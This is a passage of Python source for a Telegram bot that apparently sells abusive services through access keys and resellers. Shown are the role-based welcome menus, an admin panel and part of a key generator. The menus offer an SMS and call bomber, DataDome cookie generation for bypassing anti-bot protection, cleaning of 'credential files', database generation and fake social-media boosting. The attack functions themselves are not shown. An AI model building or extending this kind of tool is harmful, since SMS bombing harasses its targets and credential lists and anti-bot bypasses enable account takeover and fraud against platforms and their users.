            "• **🔴 𝚁𝚎𝚟𝚘𝚔𝚎 𝙰𝚌𝚌𝚎𝚜𝚜**: 𝙼𝚊𝚗𝚊𝚐𝚎 𝚠𝚑𝚘 𝚑𝚊𝚜 𝚊𝚌𝚌𝚎𝚜𝚜.\n"
            "• **📋 𝚄𝚜𝚎𝚛 𝙻𝚒𝚜𝚝**: 𝚅𝚒𝚎𝚠 𝚊𝚕𝚕 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚞𝚜𝚎𝚛𝚜.\n"
            "• **💾 𝙳𝚊𝚝𝚊𝚋𝚊𝚜𝚎 𝚂𝚝𝚊𝚝𝚞𝚜**: 𝙲𝚑𝚎𝚌𝚔 𝚝𝚑𝚎 𝚑𝚎𝚊𝚕𝚝𝚑 𝚊𝚗𝚍 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚘𝚏 𝚘𝚞𝚛 𝚍𝚊𝚝𝚊𝚋𝚊𝚜𝚎𝚜.\n"
            "• **🗑️ 𝙳𝚎𝚕𝚎𝚝𝚎 𝚂𝚒𝚗𝚐𝚕𝚎 𝙺𝚎𝚢**: 𝚁𝚎𝚖𝚘𝚟𝚎 𝚜𝚙𝚎𝚌𝚒𝚏𝚒𝚌 𝚊𝚌𝚌𝚎𝚜𝚜 𝚔𝚎𝚢𝚜.\n"
            "• **🛠️ 𝙼𝚊𝚒𝚗𝚝𝚎𝚗𝚊𝚗𝚌𝚎 𝙼𝚘𝚍𝚎**: 𝚃𝚘𝚐𝚐𝚕𝚎 𝚋𝚘𝚝 𝚊𝚌𝚌𝚎𝚜𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚏𝚘𝚛 𝚎𝚟𝚎𝚛𝚢𝚘𝚗𝚎 𝚎𝚕𝚜𝚎.\n"
            "• **👥 𝙼𝚊𝚗𝚊𝚐𝚎 𝚁𝚘𝚕𝚎𝚜**: 𝙰𝚜𝚜𝚒𝚐𝚗 𝚘𝚛 𝚌𝚑𝚊𝚗𝚐𝚎 𝚞𝚜𝚎𝚛 𝚛𝚘𝚕𝚎𝚜.\n"
            "• **🔐 𝙿𝚢𝚝𝚑𝚘𝚗 𝙴𝚗𝚌𝚛𝚢𝚙𝚝𝚘𝚛**: 𝚂𝚎𝚌𝚞𝚛𝚎 𝚢𝚘𝚞𝚛 𝙿𝚢𝚝𝚑𝚘𝚗 𝚜𝚌𝚛𝚒𝚙𝚝𝚜 𝚠𝚒𝚝𝚑 𝚙𝚘𝚠𝚎𝚛𝚏𝚞𝚕 𝚎𝚗𝚌𝚛𝚢𝚙𝚝𝚒𝚘𝚗!\n"
            "• **🛠️ 𝚄𝚁𝙻 & 𝙳𝚞𝚙𝚕𝚒𝚌𝚊𝚝𝚎 𝚁𝚎𝚖𝚘𝚟𝚎𝚛**: 𝚁𝚎𝚖𝚘𝚟𝚎 𝚄𝚁𝙻𝚜 𝚊𝚗𝚍 𝚍𝚞𝚙𝚕𝚒𝚌𝚊𝚝𝚎𝚜 𝚏𝚛𝚘𝚖 𝚌𝚛𝚎𝚍𝚎𝚗𝚝𝚒𝚊𝚕 𝚏𝚒𝚕𝚎𝚜.\n"
            "• **🛡️ 𝙳𝚊𝚝𝚊𝙳𝚘𝚖𝚎 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚘𝚛**: 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝚏𝚛𝚎𝚜𝚑 𝙳𝚊𝚝𝚊𝙳𝚘𝚖𝚎 𝚌𝚘𝚘𝚔𝚒𝚎𝚜 𝚏𝚘𝚛 𝚋𝚢𝚙𝚊𝚜𝚜𝚒𝚗𝚐 𝚊𝚗𝚝𝚒-𝚋𝚘𝚝 𝚙𝚛𝚘𝚝𝚎𝚌𝚝𝚒𝚘𝚗.\n"
            "• **💣 𝚂𝙼𝚂 𝚊𝚗𝚍 𝙲𝚊𝚕𝚕 𝙱𝚘𝚖𝚋𝚎𝚛**: 𝙰𝚍𝚟𝚊𝚗𝚌𝚎𝚍 𝚖𝚞𝚕𝚝𝚒-𝚜𝚎𝚛𝚟𝚒𝚌𝚎 𝚂𝙼𝚂 𝚊𝚗𝚍 𝚌𝚊𝚕𝚕 𝚋𝚘𝚖𝚋𝚒𝚗𝚐 𝚝𝚘𝚘𝚕.\n"
            "• **🚀 𝚂𝚘𝚌𝚒𝚊𝚕 𝙼𝚎𝚍𝚒𝚊 𝙱𝚘𝚘𝚜𝚝𝚎𝚛𝚛**: 𝙱𝚘𝚘𝚜𝚝 𝚃𝚒𝚔𝚃𝚘𝚔, 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖, 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔, 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖, 𝚃𝚠𝚒𝚝𝚝𝚎𝚛, 𝚈𝚘𝚞𝚃𝚞𝚋𝚎\n"
            "• **💬 𝙵𝚎𝚎𝚍𝚋𝚊𝚌𝚔**: 𝚂𝚎𝚗𝚍 𝚢𝚘𝚞𝚛 𝚝𝚑𝚘𝚞𝚐𝚑𝚝𝚜 𝚍𝚒𝚛𝚎𝚌𝚝𝚕𝚢 𝚝𝚘 𝚝𝚑𝚎 𝚍𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛.\n\n"
            "🚀 *𝙺𝚎𝚢 𝙵𝚎𝚊𝚝𝚞𝚛𝚎𝚜*: 𝙰𝚞𝚝𝚘-𝙳𝚎𝚕𝚎𝚝𝚎 𝚏𝚞𝚗𝚌𝚝𝚒𝚘𝚗𝚊𝚕𝚒𝚝𝚢 & 𝚁𝚎𝚊𝚕-𝚝𝚒𝚖𝚎 𝚂𝚝𝚊𝚝𝚒𝚜𝚝𝚒𝚌𝚜."
        )
    elif is_at_least_role(user_id, "reseller"):
         inline_keyboard_layout = [
            [InlineKeyboardButton("📂 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙵𝙸𝙻𝙴𝚂", callback_data="show_generate_menu"),
             InlineKeyboardButton("📊 𝙼𝚈 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂", callback_data="show_stats")],
            [InlineKeyboardButton("⭐ 𝚄𝚂𝙴 𝙰𝙲𝙲𝙴𝚂𝚂 𝙺𝙴𝚈", callback_data="prompt_key"),
             InlineKeyboardButton("⚙️ 𝙿𝚈𝚃𝙷𝙾𝙽 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙾𝚁", callback_data="start_encryption")],
            [InlineKeyboardButton("🛠️ 𝚄𝚁𝙻 𝙰𝙽𝙳 𝙳𝚄𝙿𝙻𝙸𝙲𝙰𝚃𝙴 𝚁𝙴𝙼𝙾𝚅𝙴𝚁", callback_data="url_duplicate_remover")],
            [InlineKeyboardButton("🛡️ 𝙳𝙰𝚃𝙰𝙳𝙾𝙼𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁", callback_data="datadome_menu")],
            [InlineKeyboardButton("💣 𝚂𝙼𝚂 𝙰𝙽𝙳 𝙲𝙰𝙻𝙻 𝙱𝙾𝙼𝙱𝙴𝚁", callback_data="sms_bomber_menu")],
            [InlineKeyboardButton("🚀 𝚂𝙾𝙲𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 𝙱𝙾𝙾𝚂𝚃𝙴𝚁", callback_data="social_media_booster_menu")],
            [InlineKeyboardButton("🔑 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙺𝙴𝚈", callback_data="admin_gen_key")],
            [InlineKeyboardButton("📋 𝙼𝚈 𝚁𝙴𝙵𝙵𝙴𝚁𝙰𝙻 𝚜ᴛᴀᴛ𝚂", callback_data="reseller_stats")],
            [InlineKeyboardButton("ℹ️ 𝙷𝙴𝙻𝙿 𝙰𝙽𝙳 𝙸𝙽𝙵𝙾", callback_data="show_help")],
            [InlineKeyboardButton("💬 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺 𝙷𝙴𝚁𝙴", callback_data="prompt_feedback")]
        ]
         access_status = "✅ Active" if has_access(user_id) else "❌ No Access"
         welcome_msg = (
            f"👋 **𝙶𝚛𝚎𝚎𝚝𝚒𝚗𝚐𝚜, {user.first_name}!𝚆𝚎𝚕𝚌𝚘𝚖𝚎𝚎 𝚝𝚘 {BOT_DISPLAY_NAME}!**\n\n"
            f"🔐 *𝚈𝚘𝚞𝚛 𝙰𝚌𝚌𝚎𝚜𝚜 𝚂𝚝𝚊𝚝𝚞𝚜*: **{access_status}**\n"
            f"🌟 *𝚈𝚘𝚞𝚛 Role*: **𝚁𝚎𝚜𝚎𝚕𝚕𝚎𝚛**\n\n"
            "✨ *𝚈𝚘𝚞𝚛 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜:*\n"
            "• **📂 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙵𝙸𝙻𝙴𝚂**: 𝙰𝚌𝚌𝚎𝚜𝚜 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚍𝚊𝚝𝚊𝚋𝚊𝚜𝚎 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚒𝚘𝚗.\n"
            "• **✨ 𝚄𝚂𝙴 𝙰𝙲𝙲𝙴𝚂𝚂 𝙺𝙴𝚈**: 𝙰𝚌𝚝𝚒𝚟𝚊𝚝𝚎 𝚗𝚎𝚠 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚔𝚎𝚢𝚜.\n"
            "• **📊 𝙼𝚈 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂**: 𝚅𝚒𝚎𝚠 𝚢𝚘𝚞𝚛 𝚙𝚎𝚛𝚜𝚘𝚗𝚊𝚕 𝚞𝚜𝚊𝚐𝚎 𝚜𝚝𝚊𝚝𝚜.\n"
            "• **🔑 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙺𝙴𝚈**: 𝙲𝚛𝚎𝚊𝚝𝚎 𝚗𝚎𝚠 𝚊𝚌𝚌𝚎𝚜𝚜 𝚔𝚎𝚢𝚜 𝚏𝚘𝚛 𝚢𝚘𝚞𝚛 𝚌𝚞𝚜𝚝𝚘𝚖𝚎𝚛𝚜.\n"
            "• **🔐 𝙿𝚈𝚃𝙷𝙾𝙽 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙾𝚁**: 𝚂𝚎𝚌𝚞𝚛𝚎 𝚢𝚘𝚞𝚛 𝙿𝚢𝚝𝚑𝚘𝚗 𝚜𝚌𝚛𝚒𝚙𝚝𝚜 𝚠𝚒𝚝𝚑 𝚙𝚘𝚠𝚎𝚛𝚏𝚞𝚕 𝚎𝚗𝚌𝚛𝚢𝚙𝚝𝚒𝚘𝚗!\n"
            "• **🛠️ 𝚄𝚁𝙻 𝙰𝙽𝙳 𝙳𝚄𝙿𝙻𝙸𝙲𝙰𝚃𝙴 𝚁𝙴𝙼𝙾𝚅𝙴𝚁**: Remove URLs and duplicates from credential files.\n"
            "• **🛡️ 𝙳𝙰𝚃𝙰𝙳𝙾𝙼𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁**: 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 fresh DataDome cookies for bypassing anti-bot protection.\n"
            "• **💣 𝚂𝙼𝚂 𝙰𝙽𝙳 𝙲𝙰𝙻𝙻 𝙱𝙾𝙼𝙱𝙴𝚁**: 𝙰𝚍𝚟𝚊𝚗𝚌𝚎𝚍 𝚖𝚞𝚕𝚝𝚒-𝚜𝚎𝚛𝚟𝚒𝚌𝚎 𝚂𝙼𝚂 𝚊𝚗𝚍 𝚌𝚊𝚕𝚕 𝚋𝚘𝚖𝚋𝚒𝚗𝚐 𝚝𝚘𝚘𝚕.\n"
            "• **🚀 𝚂𝙾𝙲𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 𝙱𝙾𝙾𝚂𝚃𝙴𝚁**: 𝙱𝚘𝚘𝚜𝚝 TikTok, 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖, 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔, 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖, 𝚃𝚠𝚒𝚝𝚝𝚎𝚛, 𝚈𝚘𝚞𝚃𝚞𝚋𝚎\n"
            "• **📋 𝙼𝚈 𝚁𝙴𝙵𝙵𝙴𝚁𝙰𝙻 𝚂𝚃𝙰𝚃𝚂**: 𝚃𝚛𝚊𝚌𝚔 𝚢𝚘𝚞𝚛 𝚔𝚎𝚢 𝚊𝚌𝚝𝚒𝚟𝚊𝚝𝚒𝚘𝚗𝚜. (𝙲𝚘𝚖𝚒𝚗𝚐 𝚂𝚘𝚘𝚗!)\n"
            "• **💬 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺**: Share 𝚢𝚘𝚞𝚛 𝚒𝚍𝚎𝚊𝚜 𝚘𝚛 𝚛𝚎𝚙𝚘𝚛𝚝 𝚒𝚜𝚜𝚞𝚎𝚜.\n"
            "• **ℹ️ 𝙷𝙴𝙻𝙿 𝙰𝙽𝙳 𝙸𝙽𝙵𝙾**: 𝙵𝚒𝚗𝚍 𝚊𝚗𝚜𝚠𝚎𝚛𝚜 𝚝𝚘 𝚢𝚘𝚞𝚛 𝚚𝚞𝚎𝚜𝚝𝚒𝚘𝚗𝚜.\n\n"
            "For 𝚊𝚗𝚢 𝚊𝚜𝚜𝚒𝚜𝚝𝚊𝚗𝚌𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝: @Khatelynnnnnn"
        )

    else:
        if MAINTENANCE_MODE:
            await current_message.reply_text(
                "🛠️ **𝚃𝚑𝚎 𝚋𝚘𝚝 𝚒𝚜 𝚞𝚗𝚍𝚎𝚛 𝚖𝚊𝚒𝚗𝚝𝚎𝚗𝚊𝚗𝚌𝚎**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴡᴇ'ʟʟ ʙᴇ ʙᴀᴄᴋ ᴏɴʟɪɴᴇ sʜᴏʀᴛʟʏ!",
                parse_mode="Markdown"
            )
            return

        inline_keyboard_layout = [
            [InlineKeyboardButton("📂 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙵𝙸𝙻𝙴𝚂", callback_data="show_generate_menu"),
             InlineKeyboardButton("📊 𝙼𝚈 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂", callback_data="show_stats")],
            [InlineKeyboardButton("⭐ 𝚄𝚂𝙴 𝙰𝙲𝙲𝙴𝚂𝚂 𝙺𝙴𝚈", callback_data="prompt_key"),
             InlineKeyboardButton("⚙️ 𝙿𝚈𝚃𝙷𝙾𝙽 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙾𝚁", callback_data="start_encryption")],
            [InlineKeyboardButton("🛠️ 𝚄𝚁𝙻 𝙰𝙽𝙳 𝙳𝚄𝙿𝙻𝙸𝙲𝙰𝚃𝙴 𝚁𝙴𝙼𝙾𝚅𝙴𝚁", callback_data="url_duplicate_remover")],
            [InlineKeyboardButton("🛡️ 𝙳𝙰𝚃𝙰𝙳𝙾𝙼𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁", callback_data="datadome_menu")],
            [InlineKeyboardButton("💣 𝚂𝙼𝚂 𝙰𝙽𝙳 𝙲𝙰𝙻𝙻 𝙱𝙾𝙼𝙱𝙴𝚁", callback_data="sms_bomber_menu")],
            [InlineKeyboardButton("🚀 𝚂𝙾𝙲𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 𝙱𝙾𝙾𝚂𝚃𝙴𝚁", callback_data="social_media_booster_menu")],
            [InlineKeyboardButton("ℹ️ 𝙷𝙴𝙻𝙿 𝙰𝙽𝙳 𝙸𝙽𝙵𝙾", callback_data="show_help")],
            [InlineKeyboardButton("💬 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺 𝙷𝙴𝚁𝙴", callback_data="prompt_feedback")]
        ]
        
        access_status = "✅ Active" if has_access(user_id) else "❌ No Access"
        welcome_msg = (
            f"👋 **𝙷𝚎𝚕𝚕𝚘, {user.first_name}! 𝚠𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 {BOT_DISPLAY_NAME}!**\n\n"
            f"🔐 *𝚈𝚘𝚞𝚛 𝙰𝚌𝚌𝚎𝚜𝚜 𝚂𝚝𝚊𝚝𝚞𝚜*: **{access_status}**\n\n"
            "✨ *𝚈𝚘𝚞𝚛 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝙲𝚘𝚖𝚖𝚊𝚗𝚍𝚜:*\n"
            "• **📂 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝙵𝚒𝚕𝚎𝚜**: 𝙰𝚌𝚌𝚎𝚜𝚜 𝚙𝚘𝚠𝚎𝚛𝚏𝚞𝚕 database generation.\n"
            "• **🔍 𝚂𝚎𝚊𝚛𝚌𝚑 𝙳𝚊𝚝𝚊𝚋𝚊𝚜𝚎**: 𝙵𝚒𝚗𝚍 𝚜𝚙𝚎𝚌𝚒𝚏𝚒𝚌 𝚍𝚊𝚝𝚊 𝚠𝚒𝚝𝚑𝚒𝚗 𝚘𝚞𝚛 𝚍𝚊𝚝𝚊𝚋𝚊𝚜𝚎𝚜. (𝙲𝚘𝚖𝚒𝚗𝚐 𝚂𝚘𝚘𝚗!)\n"
            "• **♨️ 𝚄𝚂𝙴 𝙰𝙲𝙲𝙴𝚂𝚂 𝙺𝙴𝚈**: 𝙰𝚌𝚝𝚒𝚟𝚊𝚝𝚎 𝚢𝚘𝚞𝚛 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚔𝚎𝚢.\n"
            "• **📊 𝙼𝚈 𝚂𝚃𝙰𝚃𝙸𝚂𝚃𝙸𝙲𝚂**: 𝚃𝚛𝚊𝚌𝚔 𝚢𝚘𝚞𝚛 𝚞𝚜𝚊𝚐𝚎 𝚊𝚗𝚍 𝚙𝚛𝚘𝚐𝚛𝚎𝚜𝚜.\n"
            "• **🔐 𝙿𝚈𝚃𝙷𝙾𝙽 𝙴𝙽𝙲𝚁𝚈𝙿𝚃𝙾𝚁**: 𝚂𝚎𝚌𝚞𝚛𝚎 𝚢𝚘𝚞𝚛 𝙿𝚢𝚝𝚑𝚘𝚗 𝚜𝚌𝚛𝚒𝚙𝚝𝚜 𝚠𝚒𝚝𝚑 𝚙𝚘𝚠𝚎𝚛𝚏𝚞𝚕 𝚎𝚗𝚌𝚛𝚢𝚙𝚝𝚒𝚘𝚗!\n"
            "• **🛠️ 𝚄𝚁𝙻 𝙰𝙽𝙳 𝙳𝚄𝙿𝙻𝙸𝙲𝙰𝚃𝙴 𝚁𝙴𝙼𝙾𝚅𝙴𝚁**: 𝚁𝚎𝚖𝚘𝚟𝚎 𝚄𝚁𝙻𝚜 𝚊𝚗𝚍 𝚍𝚞𝚙𝚕𝚒𝚌𝚊𝚝𝚎𝚜 𝚏𝚛𝚘𝚖 𝚌𝚛𝚎𝚍𝚎𝚗𝚝𝚒𝚊𝚕 𝚏𝚒𝚕𝚎𝚜.\n"
            "• **🛡️ 𝙳𝙰𝚃𝙰𝙳𝙾𝙼𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙾𝚁**: 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝚏𝚛𝚎𝚜𝚑 𝙳𝚊𝚝𝚊𝙳𝚘𝚖𝚎 𝚌𝚘𝚘𝚔𝚒𝚎𝚜 𝚏𝚘𝚛 𝚋𝚢𝚙𝚊𝚜𝚜𝚒𝚗𝚐 𝚊𝚗𝚝𝚒-𝚋𝚘𝚝 𝚙𝚛𝚘𝚝𝚎𝚌𝚝𝚒𝚘𝚗.\n"
            "• **💣 𝚂𝙼𝚂 𝙰𝙽𝙳 𝙲𝙰𝙻𝙻 𝙱𝙾𝙼𝙱𝙴𝚁**: 𝙰𝚍𝚟𝚊𝚗𝚌𝚎𝚍 𝚖𝚞𝚕𝚝𝚒-𝚜𝚎𝚛𝚟𝚒𝚌𝚎 𝚂𝙼𝚂 𝚊𝚗𝚍 𝚌𝚊𝚕𝚕 𝚋𝚘𝚖𝚋𝚒𝚗𝚐 𝚝𝚘𝚘𝚕.\n"
            "• **🚀 𝚂𝙾𝙲𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 𝙱𝙾𝙾𝚂𝚃𝙴𝚁**: 𝙱𝚘𝚘𝚜𝚝 𝚃𝚒𝚔𝚃𝚘𝚔, 𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖, 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔, 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖, 𝚃𝚠𝚒𝚝𝚝𝚎𝚛, 𝚈𝚘𝚞𝚃𝚞𝚋𝚎\n"
            "• **💬 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺**: Send your 𝚜𝚞𝚐𝚐𝚎𝚜𝚝𝚒𝚘𝚗𝚜 𝚘𝚛 𝚛𝚎𝚙𝚘𝚛𝚝 𝚙𝚛𝚘𝚋𝚕𝚎𝚖𝚜.\n"
            "• ** 𝙷𝙴𝙻𝙿 𝙰𝙽𝙳 𝙸𝙽𝙵𝙾**: 𝙶𝚎𝚝 𝚊𝚜𝚜𝚒𝚜𝚝𝚊𝚗𝚌𝚎 𝚊𝚗𝚍 𝚕𝚎𝚊𝚛𝚗 𝚖𝚘𝚛𝚎 𝚊𝚋𝚘𝚞𝚝 𝚝𝚑𝚎 𝚋𝚘𝚝.\n\n"
            "𝙽𝚎𝚎𝚍 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚊𝚌𝚌𝚎𝚜? 𝙳𝙼 𝚝𝚑𝚎 𝚋𝚘𝚝 𝚘𝚠𝚗𝚎𝚛: @Khatelynnnnnn"
        )
    
    inline_reply_markup = InlineKeyboardMarkup(inline_keyboard_layout)

    try:
        temp_message_for_removal = await current_message.reply_text("Initializing Bot Interface...", reply_markup=ReplyKeyboardRemove())
        await temp_message_for_removal.delete()
    except Exception as e:
        logging.debug(f"Could not explicitly remove reply keyboard: {e}")
    
    if edit_message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=current_message.chat_id,
                message_id=edit_message_id,
                text=welcome_msg,
                reply_markup=inline_reply_markup,
                parse_mode="Markdown"
            )
        except BadRequest as e:
            logging.warning(f"Could not edit message {edit_message_id}, sending new message instead: {e}")
            await current_message.reply_text(
                welcome_msg,
                reply_markup=inline_reply_markup,
                parse_mode="Markdown"
            )
    else:
        await current_message.reply_text(
            welcome_msg,
            reply_markup=inline_reply_markup,
            parse_mode="Markdown"
        )

    logging.info(f"User {user_id} ({user.first_name}) started the bot with role: {USER_ROLES.get(user_id, 'user')}")

# ========== ADMIN FUNCTIONS ==========
async def admin_panel(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_panel called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await update.callback_query.answer("❌ Access Denied!", show_alert=True)
            await current_message.edit_text("❌ **Access Denied!** This panel is for the owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **Access Denied!** This panel is for the owner only.", parse_mode="Markdown")
        return
    
    db_stats, total_lines = get_database_stats()
    active_users = len([uid for uid in USER_ACCESS.keys() if has_access(uid)])
    total_users = len(USER_ACCESS)
    available_keys = len(ACCESS_KEYS)
    
    admin_text = (
        f"👑 **𝙰𝚍𝚖𝚒𝚗 𝙲𝚘𝚗𝚝𝚛𝚘𝚕 𝚂𝚢𝚜𝚝𝚎𝚖**\n\n"
        f"📊 *𝚂𝚢𝚜𝚝𝚎𝚖 𝙾𝚟𝚎𝚛𝚟𝚒𝚎𝚠:*\n"
        f"• 𝚃𝚘𝚝𝚊𝚕 𝚄𝚜𝚎𝚛𝚜: **{total_users}**\n"
        f"• 𝙰𝚌𝚝𝚒𝚟𝚎 𝚄𝚜𝚎𝚛𝚜: **{active_users}**\n"
        f"• 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝙺𝚎𝚢𝚜: **{available_keys}**\n"
        f"• 𝚃𝚘𝚝𝚊𝚕 𝙳𝚊𝚝𝚊𝚋𝚊𝚜𝚎 𝙻𝚒𝚗𝚎𝚜: **{total_lines:,}**\n\n"
        f"🛠️ *𝙼𝚊𝚒𝚗𝚝𝚎𝚗𝚊𝚗𝚌𝚎 𝙼𝚘𝚍𝚎 𝚂𝚝𝚊𝚝𝚞𝚜*: {'**✅ 𝙾𝚗**' if MAINTENANCE_MODE else '**❌ 𝙾𝚏𝚏**'}\n\n"
        f"🗄️ *𝙳𝚊𝚝𝚊𝚋𝚊𝚜𝚎 𝙷𝚎𝚊𝚕𝚝𝚑 𝙲𝚑𝚎𝚌𝚔:*\n"
    )
    
    for db_name, count in db_stats.items():
        status = "🟢 HEALTHY" if count > 1000 else "🟡 MODERATE" if count > 100 else "🔴 LOW" if count > 0 else "⚫ EMPTY"
        admin_text += f"• {status}: **{db_name}** ({count:,} lines)\n"
    
    keyboard = [
        [InlineKeyboardButton("🔑 ɢᴇɴᴇʀᴀᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ", callback_data="admin_gen_key_single")],
        [InlineKeyboardButton("🗝️ ɢᴇɴᴇʀᴀᴛᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴋᴇʏs", callback_data="admin_gen_key_multi")],
        [InlineKeyboardButton("📋 ᴜsᴇʀ ʟɪsᴛs", callback_data="admin_users"),
         InlineKeyboardButton("🔴 ʀᴇᴠᴏᴋᴇ ᴜsᴇʀ/ᴋᴇʏ", callback_data="admin_revoke")],
        [InlineKeyboardButton("📣 sᴇɴᴅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ", callback_data="admin_announce"),
         InlineKeyboardButton("💾 ʙᴀᴄᴋᴜᴘ ᴅᴀᴛᴀ", callback_data="admin_backup")],
        [InlineKeyboardButton("🔄 ʀᴇʟᴏᴀᴅ ᴅᴀᴛᴀʙᴀsᴇs", callback_data="admin_reload"),
         InlineKeyboardButton("🗑️ ᴅᴇʟᴇᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ", callback_data="admin_delete_single_key")],
        [InlineKeyboardButton("🛠 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴏᴘᴛɪᴏɴs", callback_data="show_maintenance_options")],
        [InlineKeyboardButton("👥 ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs", callback_data="admin_manage_roles")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await current_message.edit_text(admin_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(admin_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_key_command(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("generate_key_command called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "reseller"):
        if update.callback_query:
            await update.callback_query.answer("❌ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍!", show_alert=True)
            await current_message.edit_text("❌ **𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍** 𝚈𝚘𝚞 𝚍𝚘 𝚗𝚘𝚝 𝚑𝚊𝚟𝚎𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗 𝚝𝚘 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝚔𝚎𝚢𝚜.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍!** 𝚈𝚘𝚞 𝚍𝚘 𝚗𝚘𝚝 𝚑𝚊𝚟𝚎 𝚙𝚎𝚛𝚖𝚒𝚜𝚜𝚒𝚘𝚗 𝚝𝚘 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝚔𝚎𝚢𝚜.", parse_mode="Markdown")
        return

    if update.callback_query and update.callback_query.data == "admin_gen_key_multi":
        AWAITING_KEY_COUNT.add(user_id)
        message_text = (
            "🗝️ *𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 Multiple Access Keys** 🗝️\n\n"
            "𝙿𝚕𝚎𝚊𝚜𝚎 𝚜𝚎𝚗𝚍 𝚝𝚑𝚎 *𝚗𝚞𝚖𝚋𝚎𝚛 𝚘𝚏 𝚔𝚎𝚢𝚜* 𝚢𝚘𝚞 𝚠𝚒𝚜𝚑 𝚝𝚘 𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎 (𝚎𝚡𝚊𝚖𝚙𝚕𝚎...`5` `10`).\n"
